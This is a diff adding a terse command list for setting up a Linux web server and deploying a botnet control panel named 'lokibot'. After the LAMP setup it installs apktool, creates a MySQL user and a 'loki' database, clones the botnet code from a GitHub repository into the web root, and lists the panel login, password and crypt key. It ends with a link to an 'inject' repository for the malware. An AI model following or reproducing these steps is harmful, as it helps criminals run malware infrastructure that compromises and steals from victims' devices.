@@ -1,0 +1,54 @@
+su
+cd ~
+apt-get update && apt-get upgrade -y
+apt install nano
+apt install unzip
+apt install zip
+apt install node
+apt install npm
+apt install mv
+apt install git
+apt install wget
+apt install sudo
+_____________________________________________________
+apt install apache2
+apt-get install -y mysql-server
+add-apt-repository ppa:ondrej/php
+apt install software-properties-common ca-certificates lsb-release apt-transport-https 
+apt install php5.6
+apt install php5.6-mysql php5.6-mbstring php5.6-xml php5.6-curl php5.6-json php5.6-zip
+service apache2 restart
+_____________________________________________________
+apktool install
+git clone https://github.com/h4ckti2/apktool
+cd apktool
+chmod 777 *.*
+mv *.* /usr/local/bin/
+cd ~
+________________________
+java install
+apt-get install default-jre default-jdk -y
+apt-get install ia32-libs lib32z1 lib32ncurses5 -y
+dpkg --add-architecture i386
+apt-get install libstdc++6:i386 libgcc1:i386 zlib1g:i386 libncurses5:i386 lib32z1 lib32ncurses5
+______________________________________
+install botnet
+mysql -u root -p
+CREATE USER 'lokiadmin'@'127.0.0.1' IDENTIFIED BY 'Ajh95a6M';
+GRANT ALL PRIVILEGES ON * . * TO 'lokiadmin'@'127.0.0.1';
+create database loki;
+ctrl + D
+cd ~
+git clone https://github.com/h4ckti2/lokibot
+cd lokibot
+mv *.* /var/www/html
+cd /var/www/html
+mysql -u root -p loki < mysql.sql
+________________________
+login
+user;bot4fun
+pass;J1HPbmr
+cryptKey = loki
+____________
+inject
+https://github.com/h4ckti2/injectlokibot
